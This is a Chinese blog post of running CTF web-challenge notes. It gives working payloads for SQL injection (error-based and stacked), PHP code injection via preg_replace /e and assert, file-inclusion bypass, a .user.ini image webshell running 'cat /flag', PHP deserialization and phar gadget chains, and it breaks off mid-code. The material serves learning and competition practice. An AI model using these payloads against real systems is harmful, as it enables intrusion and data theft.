<!DOCTYPE html>
<html>
  <!-- Html Head Tag-->
  <head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="description" content>
  <meta name="author" content="disshu">
  <!-- Open Graph Data -->
  <meta property="og:title" content="CTF比赛随记(持续更新)">
  <meta property="og:description" content>
  <meta property="og:site_name" content="disshu">
  <meta property="og:type" content="article">
  <meta property="og:image" content="http://yoursite.com">
  
    <link rel="alternate" href="/atom.xml" title="disshu" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  

  <!-- Site Title -->
  <title>disshu</title>

  <!-- Bootstrap CSS -->
  <link rel="stylesheet" href="/disshu.github.io/css/bootstrap.min.css">
  <!-- Custom CSS -->
  
  <link rel="stylesheet" href="/disshu.github.io/css/style.dark.css">

  <!-- Google Analytics -->
  

</head>

  <body>
    <!-- Page Header -->


<header class="site-header header-background" style="background-image: url(/disshu.github.io//img/cumt.png)">
  <div class="container">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <div class="page-title with-background-image">
          <p class="title">CTF比赛随记(持续更新)</p>
          <p class="subtitle"></p>
        </div>
        <div class="site-menu with-background-image">
          <ul>
            
              <li>
                <a href="/disshu.github.io/">
                  
                  Home
                  
                </a>
              </li>
            
              <li>
                <a href="/disshu.github.io/archives">
                  
                  Archives
                  
                </a>
              </li>
            
              <li>
                <a href="https://github.com/disshu">
                  
                  Github
                  
                </a>
              </li>
            
              <li>
                <a href="mailto:15695257867@163.com">
                  
                  Email
                  
                </a>
              </li>
            
          </ul>
        </div>
      </div>
    </div>
  </div>
</header>

<article>
  <div class="container typo">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <div class="post-info text-muted">
          
            <!-- Author -->
            <span class="author info">By disshu</span>
          
          <!-- Date -->
          <span class="date-time info">On
            <span class="date">2018-10-15</span>
            <span class="time">03:23:08</span>
          </span>
          
          <!--  Categories  -->
            <span class="categories info">Under 

<a href="/disshu.github.io/categories/随记/">随记</a>
</span>
          
        </div>
        <!-- Tags -->
        
          <div class="post-tags text-muted">
            Tags: 

<a class="tag" href="/disshu.github.io/tags/CTF/">#CTF</a>


          </div>
        
        <!-- Post Main Content -->
        <div class="post-content">
          <p>做题积累日常</p>
<a id="more"></a>
<p><strong>新手区(攻防世界)</strong></p>
<p>1.X-Forwarded-For:发送的真实的ip地址<br>2.referer:返回来源地址<br>3.X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项<br>4.HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的<br>遇到编码unicode，先用python脚本解开试试<br>5.find / -name flag.txt<br>使用find按文件名来查找语法：find / -name 文件名;<br><strong>cat(攻防世界)</strong><br>总结<br>1.如果对于正常表达式，结果无效的话，就出现了过滤<br>这时候我们就可以用fuzzing测试来判断过滤了哪些字符，常用办法就是用bp构造字典，来进行爆破<br>2.宽字节报错，其实我们在构造字典的时候放几个宽字节,有可能php或django后台的编码有问题，会报错<br>3.curl命令处理，curl命令是以file=@文件的格式上传，这道题就利用了文件包含漏洞去读取，读取的时候前面要加上@<br>4.flag一般都在对方的数据库，所以我们读取文件不知道怎么下手的时候一定要尽量找到对方的数据库文件<br>ice-05(攻防世界)<br>1.用dirsearch.py扫描目录，找到有漏洞的网站<br>2.php://filter/read=convert.base64-encode/resource=xxxxx.php(文件包含漏洞专用)<br>3./e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码(在适当的逆向引用替换完之后)。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。</p>
<pre><code class="hljs undefined"><span class="hljs-keyword">if</span> ($_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="hljs-string">'127.0.0.1'</span>) &#123;

    echo <span class="hljs-string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;

    $pattern = $_GET[pat];
    $replacement = $_GET[rep];
    $subject = $_GET[<span class="hljs-function"><span class="hljs-keyword">sub</span>]</span>;

    <span class="hljs-keyword">if</span> (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123;
        preg_replace($pattern, $replacement, $subject);
    &#125;<span class="hljs-keyword">else</span>&#123;
        <span class="hljs-keyword">die</span>();
    &#125;

&#125;</code></pre>

<p>payload如下<br>1.把X-Forwarded-For换成127.0.0.1<br>2.<code>?pat=/test/e&amp;rep=phpinfo()&amp;sub=just test</code><br>pat是正则匹配模式，sub是字符串。rep是替换的内容<br><strong>php之assert()</strong></p>
<p>bool assert(mixed $assertion[,string,$description])，如果assertion是字符串，他会被assert()当做php代码执行。 思路是通过可控变量file传入恶意参数，构造闭合 file_exists(),使assert()执行恶意代码。<br>‘) or phpinfo();# ——即变成file_exists(‘’) or phpinfo();# ，结果为执行phpinfo()，注意要url编码，本处为了方便阅读，以编码前显示<br>‘) or print_r(file_get_contents(‘templates/flag.php’);# ——然后在源代码里（临门一脚不要被坑了） 即最终payload:?page=’)%20or%20print_r(file_get_contents(‘templates%2fflag.php’))%3b%23<br><strong>文件泄漏</strong><br>.rar   .zip  .7z   .tar.gz   .bak    .swp   .txt   .sql<br>##sql注入<br>报错注入<br>select concat(floor(rand(0)乘2),”======”,(查询语句)) as xx，count(1),3 from xxx group by xx<br>函数报错注入<br>1=(updatexml(1,concat(0x3a,(查询语句)),1))<br>其中的一个万能密码，如果数据库中存在比较<br><code>if(md5($pw)==$password)</code><br>如果查询的回显值select 1,2,3#,其中1的字段为id,2的字段为user,3的字段为password，那我们就可以通过构造字符串来绕过比较得到flag，例如<br><code>pw=123//这个是我们自己构造的</code><br><code>/*那么可以构造sql语句,查询123的md5,通过字符串的方式写入sql语句，那么sql后台会返给这个语句给php,md5($pw)和$password比较,前提这个第二个字段的user一定要传对,一定是正确的用户名*/</code></p>
<h1 id="sql注入-updatexml"><a href="#sql注入-updatexml" class="headerlink" title="sql注入 updatexml"></a>sql注入 updatexml</h1><p>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值<br>然后咱们再看看语句：<br><code>http://www.XXXIII.com/a.php?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</code><br>CONCAT(str1,str2,…)<br>返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。<br>通过查询@@version,返回版本。然后CONCAT将其字符串化。因为UPDATEXML第二个参数需要Xpath格式的字符串,所以不符合要求，然后报错。<br>错误大概会是：<br><code>ERROR 1105 (HY000): XPATH syntax error: ’:root@localhost’</code><br>例如最近的北京工业的比赛，一道sql注入</p>
<h1 id="爆数据库-http-172-21-4-12-10012-search-php-name-admin-df-27-and-updatexml-1-concat-1-database-1-–-amp-pw-y1ng"><a href="#爆数据库-http-172-21-4-12-10012-search-php-name-admin-df-27-and-updatexml-1-concat-1-database-1-–-amp-pw-y1ng" class="headerlink" title="爆数据库 http://172.21.4.12:10012/search.php?name=admin%df%27 and updatexml(1,concat(1,database()),1) –+&amp;pw=y1ng"></a>爆数据库 <a href="http://172.21.4.12:10012/search.php?name=admin%df%27" target="_blank" rel="noopener">http://172.21.4.12:10012/search.php?name=admin%df%27</a> and updatexml(1,concat(1,database()),1) –+&amp;pw=y1ng</h1><h1 id="Error-XPATH-syntax-error-‘web-sqli’"><a href="#Error-XPATH-syntax-error-‘web-sqli’" class="headerlink" title="Error: XPATH syntax error: ‘web_sqli’"></a>Error: XPATH syntax error: ‘web_sqli’</h1><h1 id="查表名"><a href="#查表名" class="headerlink" title="查表名"></a>查表名</h1><p><a href="http://172.21.4.12:10012/search.php?name=admin%df%27" target="_blank" rel="noopener">http://172.21.4.12:10012/search.php?name=admin%df%27</a> and updatexml(1,concat(1, (seSELECTlect group_concat(table_name) from information_schema.tables whWHEREere table_schema=database() limit 0,1)),1) –+&amp;pw=y1ng</p>
<h1 id="Error-XPATH-syntax-error-‘f14g-user’"><a href="#Error-XPATH-syntax-error-‘f14g-user’" class="headerlink" title="Error: XPATH syntax error: ‘f14g,user’"></a>Error: XPATH syntax error: ‘f14g,user’</h1><h1 id="HCTF"><a href="#HCTF" class="headerlink" title="HCTF"></a>HCTF</h1><pre><code class="hljs undefined"><span class="hljs-variable">$_page</span> = urldecode(<span class="hljs-variable">$page</span>);
            <span class="hljs-variable">$_page</span> = mb_substr(
                <span class="hljs-variable">$_page</span>,
                0,
                mb_strpos(<span class="hljs-variable">$_page</span> . <span class="hljs-string">'?'</span>, <span class="hljs-string">'?'</span>)
            );
            <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;
                <span class="hljs-built_in">return</span> <span class="hljs-literal">true</span>;
            &#125;
            <span class="hljs-built_in">echo</span> <span class="hljs-string">"you can't see it"</span>;
            <span class="hljs-built_in">return</span> <span class="hljs-literal">false</span>;</code></pre>

<pre><code class="hljs undefined">这道题是一道代码审计题，也是个文件包含题，目的是绕过函数从而执行后面的文件
传入 file=<span class="hljs-built_in">hint</span>.php ，在第一个 in_array 处会返回 <span class="hljs-literal">true</span>，然后直接包含 <span class="hljs-built_in">hint</span>.php
传入 file=<span class="hljs-built_in">hint</span>.php?/../cookie.txt ，在第二个 in_array 处会返回<span class="hljs-literal">true</span>，第二个 in_array
中的 <span class="hljs-variable">_page</span> 为 <span class="hljs-built_in">hint</span>.php ，然后包含 <span class="hljs-built_in">hint</span>.php?/../cookie.txt ，但是这里的?
起到传递参数的作用而不是破坏路径.传入 file=<span class="hljs-built_in">hint</span>.php%<span class="hljs-number">253</span>f/../cookie.txt ，在第三个 in_array 处会返回 <span class="hljs-literal">true</span> ，第三个 
in_array 中的 <span class="hljs-variable">_page</span> 为 <span class="hljs-built_in">hint</span>.php ，然后包含 <span class="hljs-built_in">hint</span>.php%<span class="hljs-number">3</span>f/../cookie.txt ，这里的 %<span class="hljs-number">3</span>f 即 
? ，破坏了路径，前面部分的路径不存在，可以包含后面的文件.这个看到file一定要想到文件包含 想办法</code></pre>

<h1 id="强网杯-随便注"><a href="#强网杯-随便注" class="headerlink" title="强网杯 随便注"></a>强网杯 随便注</h1><p>又是涨知识的一道题，这道题用了堆叠注入,就是分开查询,因为这道题都过滤了<br><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code><br>所以就想到堆叠注入<br><code>1&#39;;show databases;#</code><br><code>1&#39;;show tables;#</code><br><code>1&#39;;show columns from xxxxx;#</code><br>因为这里有两张表，回显内容肯定是从word这张表中回显的，那我们怎么才能让它回显flag所在的表呢<br>我们首先要把第一个表名改成其他的,把有flag的表名改成默认的查询的表这里也就是word表,在把flag换成id或者data因为不知道后台代码 where id=’xxxx’或data=’xxxx’<br>MySQL中反引号和单引号的区别与用法<br>    MySql 中用一对反引号来标注 SQL 语句中的标识，如数据库名、表名、字段名等<br>    引号则用来标注语句中所引用的字符型常量或日期/时间型常量，即字段值<br>    例如：select * from <code>username</code> where <code>name</code>=”peri0d”<br>    MySQL 的 show、rename 和 alter 命令<br>    show 可以用于查看当前数据库，当前表，以及表中的字段<br>    rename 用于修改 table 的名称<br>    alter 用于修改表中字段的属性<br>攻击思路：默认查询 words 表，可以将数字表的名称改成 words，这样就可以 使用 or ‘1’=’1 直接查询 flag 了<br>payloads</p>
<pre><code class="hljs undefined">?inject=1';<span class="hljs-keyword">RENAME</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-string">`words`</span> <span class="hljs-keyword">TO</span> <span class="hljs-string">`words1`</span>;<span class="hljs-keyword">RENAME</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-string">`1919810931114514`</span> <span class="hljs-keyword">TO</span> <span class="hljs-string">`words`</span>;<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-string">`words`</span> <span class="hljs-keyword">CHANGE</span> <span class="hljs-string">`flag`</span> <span class="hljs-string">`id`</span> <span class="hljs-built_in">VARCHAR</span>(<span class="hljs-number">100</span>) <span class="hljs-built_in">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span>;<span class="hljs-keyword">show</span> <span class="hljs-keyword">columns</span> <span class="hljs-keyword">from</span> words;%23</code></pre>

<h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><p>这道题是服务器模版注入攻击<br>然而我们是怎么判断的呢,因为参数后面的内容就是回显的内容,再加一点他是render渲染的就更加明确了这一点<br><code>$temp-&gt;render(&quot;Hello &quot;.$_GET[&#39;username&#39;]);</code><br>通过查阅在handler指向的处理当前这个页面的RequestHandler对象，<br>RequestHandler.settings指向self.application.settings，<br>因此handler.settings指向RequestHandler.application.settings。</p>
<h1 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy sql"></a>easy sql</h1><p>利用mysqli_multi_query()函数就支持多条sql语句同时执行,所以看到这个就要用堆叠注入<br>源码</p>
<pre><code class="hljs undefined">$sql = <span class="hljs-string">"select "</span>.$post[<span class="hljs-string">'query'</span>].<span class="hljs-string">"||flag from Flag"</span><span class="hljs-comment">;</span>
        mysqli_multi_query($MysqlLink,$sql)<span class="hljs-comment">;</span></code></pre>

<p>我们可以通过<br><code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code><br>使得||变成&amp;&amp;,就可以查询<br>非预期解<br><code>*，1</code><br><code>变成了select *,1||flag from Flag</code></p>
<h1 id="hctf-admin"><a href="#hctf-admin" class="headerlink" title="hctf admin"></a>hctf admin</h1><p>unicode欺骗</p>
<pre><code class="hljs undefined">ᴀ -&gt; A -&gt; a
ᴀdmin -&gt; Admin -&gt; admin</code></pre>

<p>首先看到代码<br><code>nodeprep.prepare</code><br>在twisted中版本过低有unicode编码漏洞,所以我们可以注册ᴀdmin并且修改密码,拿到真正的admin</p>
<h1 id="clac计算"><a href="#clac计算" class="headerlink" title="clac计算"></a>clac计算</h1><pre><code class="hljs 这是别人对PHP字符串解析漏洞的理解，">我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过:</code></pre>

<pre><code class="hljs undefined">/news.php?%20news[id%00=<span class="hljs-number">42</span><span class="hljs-string">"+AND+1=0–

上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</span></code></pre>

<pre><code class="hljs undefined">当我们给定一个参数时,num会有waf,所以我可以在num前面加个空格,解析时是一样的,然后可以在后面执行系统语句
当执行到当前目录时,有的会绕过所以我们可以用acsii码绕过
<span class="hljs-function"><span class="hljs-title">scandir</span><span class="hljs-params">(<span class="hljs-string">"/"</span>)</span></span>,但是“/”被过滤了，所以我们用chr(“<span class="hljs-number">47</span>”)绕过,发现flagg文件</code></pre>

<h1 id="burpsiute不断发包"><a href="#burpsiute不断发包" class="headerlink" title="burpsiute不断发包"></a>burpsiute不断发包</h1><p>这个一开始是我的知识盲区,其实就是普通的攻击模块不设payloads而已,具体步骤如下<br>首先我们需要把所有的payload清除<br><img src="https://img-blog.csdnimg.cn/2020012015304978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="1"><br>然后设置攻击模式为null payloads<br>payload options设为continue indefinitely<br><img src="https://img-blog.csdnimg.cn/20200120153354950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="2"><br>最后设置线程,这个是最重要的否则会造成dos<br>number of threads 设为1<br>throttle设为2500 也就是2.5s发一个<br><img src="https://img-blog.csdnimg.cn/20200120153524533.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="3"></p>
<h1 id="user-ini-checkin"><a href="#user-ini-checkin" class="headerlink" title=".user.ini(checkin)"></a>.user.ini(checkin)</h1><p>这道题运用的是.user.ini这个和.hatacess是一个性质,都是为了将上传的图片马转换为php代码解析<br>还有一个小知识点绕过php的exif_imagetype()函数，这个很好绕过，添加图片文件头就可以了<br><code>GIF98a</code><br>如果.hatacess无效的话用如下<br>大致意思就是:我们指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php),类似于在index.php中插入一句：require(./a.jpg);<br>而user.ini的应用环境如下<br>    服务器脚本语言为PHP<br>    服务器使用CGI／FastCGI模式<br>    上传目录下要有可执行的php文件<br>代码如下<br><code>GIF89a
auto_prepend_file=a.jpg</code><br>对方服务器一定要有php代码才能执行<br>再将a.jpg上传<br>`GIF89a</p>
<script language="php">system('cat /flag');</script>`
<p>盲注脚本放到web工具里看返回时bool类型吗<br>绕过空格用() tab</p>
<h1 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h1><p>Python 2.x - 2.7.16 urllib.fopen支持local_file导致LFI(CVE-2019-9948)<br>可以用local_file:// 去访问目录,例如local_file:///app/flag.txt<br>flask的app路由要会读代码</p>
<pre><code class="hljs undefined">&lt;?php
// 漏洞代码ssrf.php
$ch = curl_init(); 
curl_setopt($ch, CURLOPT_URL, $_GET['url']); 
<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">curl_setopt</span><span class="hljs-params">($<span class="hljs-variable">ch</span>, <span class="hljs-variable">CURLOPT_FOLLOWLOCATION</span>, 1)</span></span>;
curl_setopt($ch, CURLOPT_HEADER, 0); 
<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">curl_setopt</span><span class="hljs-params">($<span class="hljs-variable">ch</span>, <span class="hljs-variable">CURLOPT_PROTOCOLS</span>, <span class="hljs-variable">CURLPROTO_HTTP</span> | <span class="hljs-variable">CURLPROTO_HTTPS</span>)</span></span>;
curl_exec($ch); 
curl_close($ch); 
?&gt;</code></pre>

<h1 id="java文件泄露-java-特有的-遇见java可以尝试"><a href="#java文件泄露-java-特有的-遇见java可以尝试" class="headerlink" title="java文件泄露(java 特有的 遇见java可以尝试)"></a>java文件泄露(java 特有的 遇见java可以尝试)</h1><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。WEB-INF主要包含一下文件或目录：<br> /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。<br>    /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中<br>    /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br>    /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。<br>    /WEB-INF/database.properties：数据库配置文件<br>get 请求不到 就用post请求</p>
<h1 id="反序列化逃逸"><a href="#反序列化逃逸" class="headerlink" title="反序列化逃逸"></a>反序列化逃逸</h1><p>首先为了逃过get或post参数的长度限制(正则表达式) 可以传数组<br>反序列化逃逸是什么呢 可以通过构造语句来改变序列化参数的值<br>一道ctf为例,我们要改photo的值,使其指向flag.php<br>首先简单介绍反序列化<br>序列化</p>
<pre><code class="hljs undefined"><span class="php"><span class="hljs-meta">&lt;?php</span>
$a = <span class="hljs-keyword">array</span>(<span class="hljs-string">'123'</span>, <span class="hljs-string">'abc'</span>, <span class="hljs-string">'hu'</span>);
var_dump(serialize($a));
<span class="hljs-meta">?&gt;</span></span></code></pre>

<p>结果<br><code>string(49) &quot;a:3:{i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:2:&quot;hu&quot;;}&quot;</code><br>反序列化</p>
<pre><code class="hljs undefined">&lt;?php
<span class="hljs-regexp">//</span><span class="hljs-variable">$a</span> = array(<span class="hljs-string">'123'</span>, <span class="hljs-string">'abc'</span>, <span class="hljs-string">'hu'</span>);
<span class="hljs-regexp">//</span>var_dump(serialize(<span class="hljs-variable">$a</span>));
<span class="hljs-regexp">//</span><span class="hljs-string">"a:3:&#123;i:0;s:3:"</span><span class="hljs-number">123</span><span class="hljs-string">";i:1;s:3:"</span>abc<span class="hljs-string">";i:2;s:2:"</span>h<span class="hljs-string">u";&#125;"</span>
<span class="hljs-variable">$b</span> = <span class="hljs-string">'a:3:&#123;i:0;s:3:"123";i:1;s:3:"abc";i:2;s:2:"hu";&#125;'</span>;
var_dump(unserialize(<span class="hljs-variable">$b</span>));
?&gt;</code></pre>

<p>结果<br><code>array(3) { [0]=&gt; string(3) &quot;123&quot; [1]=&gt; string(3) &quot;abc&quot; [2]=&gt; string(2) &quot;hu&quot; }</code><br>其实我们可以构造”;}<br>  我们把第二个值abc换成abc”;i:2;s:5:”qwert”* ;}<br><code>array(3) { [0]=&gt; string(3) &quot;123&quot; [1]=&gt; string(3) &quot;abc&quot; [2]=&gt; string(4) &quot;defg&quot; }</code><br>那么之后的hu就被遗弃了<br>那么怎么让qwert被逃逸呢 注意遗弃和逃逸不一样 逃逸还能被识别<br>我们可以在前面的长度动手脚 前面增加的长度等于后面的逃逸长度<br>例如要逃逸如下代码 长度为33<br><code>&quot;;s:5:&quot;photo&quot;;s:10:&quot;flag.php&quot;;}</code><br>那么前面的s就要增加33位,如题所示(0CTF 2016]piapiapia)<br>where select一些敏感字会被替换成hacker 那我们就多加33个where<br>增加s的数量=33乘hacker 因为是被替换的<br>33个where+”;s:5:”photo”;s:10:”flag.php”;} photo就会被解析成flag.php<br>但此题有些小技巧</p>
<pre><code class="hljs undefined">之前我传入的是";<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:5</span><span class="hljs-selector-pseudo">:"photo"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:10</span><span class="hljs-selector-pseudo">:"flag.php"</span>;&#125;结果失败了，看了网上的一些文章，发现他们传入的是";&#125;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:5</span><span class="hljs-selector-pseudo">:"photo"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:10</span><span class="hljs-selector-pseudo">:"flag.php"</span>;&#125;为什么前面要多加一个&#125;，后来发现是因为我们<span class="hljs-selector-tag">nickname</span>构造成了数组，而不是字符，所以要加&#125;闭合一下。</code></pre>

<p>所以是34个where</p>
<h1 id="phar协议漏洞"><a href="#phar协议漏洞" class="headerlink" title="phar协议漏洞"></a>phar协议漏洞</h1><p>利用条件<br>phar文件要能够上传到服务器端。<br>如file_exists()，fopen()，file_get_contents()，file()等文件操作的函数<br>要有可用的魔术方法作为“跳板”。<br>文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。<br>举个例子<br>upload_file.php，后端检测文件上传，文件类型是否为gif，文件后缀名是否为gif<br>upload_file.html 文件上传表单<br>file_un.php 存在file_exists()，并且存在__destruct()<br>我们要写payload绕过gif并且让他执行phpinfo();这就要根据file_un.php<br>生成phar payloads固定流程为:</p>
<pre><code class="hljs undefined"><span class="php"><span class="hljs-meta">&lt;?php</span>
    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;
    &#125;
    $phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">"phar.phar"</span>); <span class="hljs-comment">//后缀名必须为phar</span>
    $phar-&gt;startBuffering();
    $phar-&gt;setStub(<span class="hljs-string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="hljs-comment">//设置stub</span>
    $o = <span class="hljs-keyword">new</span> TestObject();<span class="hljs-comment">//题目给定的条件</span>
    $o -&gt; data=<span class="hljs-string">'hu3sky'</span>;要写的payloads
    $phar-&gt;setMetadata($o); <span class="hljs-comment">//将自定义的meta-data存入manifest</span>
    $phar-&gt;addFromString(<span class="hljs-string">"test.txt"</span>, <span class="hljs-string">"test"</span>); <span class="hljs-comment">//添加要压缩的文件</span>
    <span class="hljs-comment">//签名自动计算</span>
    $phar-&gt;stopBuffering();
<span class="hljs-meta">?&gt;</span></span></code></pre>

<p>如下题的file_un.php</p>
<pre><code class="hljs undefined"><span class="php"><span class="hljs-meta">&lt;?php</span>
$filename=$_GET[<span class="hljs-string">'filename'</span>];
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AnyClass</span></span>&#123;
    <span class="hljs-keyword">var</span> $output = <span class="hljs-string">'echo "ok";'</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span>
    </span>&#123;
        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span> -&gt; output);
    &#125;
&#125;
file_exists($filename);<span class="hljs-comment">//一定要存在 不然没法读取</span></span></code></pre>

<p>payloads为</p>
<pre><code class="hljs undefined"><span class="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AnyClass</span></span>&#123;
    <span class="hljs-keyword">var</span> $output = <span class="hljs-string">'echo "ok";'</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span>
    </span>&#123;
        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span> -&gt; output);
    &#125;
&#125;
$phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">'phar.phar'</span>);
$phar -&gt; stopBuffering();
$phar -&gt; setStub(<span class="hljs-string">'GIF89a'</span>.<span class="hljs-string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);
$phar -&gt; addFromString(<span class="hljs-string">'test.txt'</span>,<span class="hljs-string">'test'</span>);
$object = <span class="hljs-keyword">new</span> AnyClass();
$object -&gt; output= <span class="hljs-string">'phpinfo();'</span>;
$phar -&gt; setMetadata($object);
$phar -&gt; stopBuffering();</span></code></pre>

<p>将phar伪造成其他格式的文件<br>在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是<strong>HALT_COMPILER();?&gt;这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。<br>生成phar.phar要改成.gif <code>$phar -&gt; setStub(&#39;GIF89a&#39;.&#39;&lt;?php __HALT_COMPILER();?&gt;&#39;);</code>是关键<br>之后用根据file_exits()访问<br><code>payload:filename=phar://upload_file/phar.gif</code><br><strong>魔术方法的巧妙运用</strong><br>利用一道题看魔术方法来回调用<br>`</strong>destruct()<code>销毁的时候调用</code><strong>construct()<code>构造函数</code></strong>call()`当调用方法不存在或者私有的时候调用<br>例如File类有如下方法读取文件</p>
<pre><code class="hljs undefined"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> </span>&#123;
    <span class="hljs-keyword">public</span> $filename;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span><span class="hljs-params">()</span> </span>&#123;
        <span class="hljs-keyword">return</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;filename);
    &#125;
&#125;</code></pre>

<p>user类如下</p>
<pre><code class="hljs undefined">class<span class="hljs-built_in"> User </span>&#123;
    public <span class="hljs-variable">$db</span>;
    public function __destruct() &#123;
        <span class="hljs-variable">$this</span>-&gt;db-&gt;close();
    &#125;
&#125;</code></pre>

<p>当我们实例化user 销毁时会读取文件 那可能想当然 让file的filename=我们想要读取的文件,因为他没有构造函数,无法给予<br>下面存在这样一个类</p>
<pre><code class="hljs undefined"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span> </span>&#123;
    <span class="hljs-keyword">private</span> $files;
    <span class="hljs-keyword">private</span> $results;
    <span class="hljs-keyword">private</span> $funcs;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span><span class="hljs-params">($func, $args)</span> </span>&#123;
        array_push(<span class="hljs-keyword">$this</span>-&gt;funcs, $func);<span class="hljs-comment">//迷惑你的 </span>
        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;files <span class="hljs-keyword">as</span> $file) &#123;
            <span class="hljs-keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();
        &#125;
    &#125;</code></pre>

<p>call()帮助我们很多<br>如果user的db指向一个filelist类 当我们实例化他的时候 因为close方法不在filelist类里,所以call被调用 $func=close 并且通过this-&gt;flies读取<br>注意一点$this-&gt;files是个数组 因为只有数组会用foreach遍历 那么我们就可以$this-&gt;files=array(我们想要读的文件),再结合phar<br>payloads如下</p>
<pre><code class="hljs undefined"><span class="php"><span class="hljs-meta">&lt;?php</span>

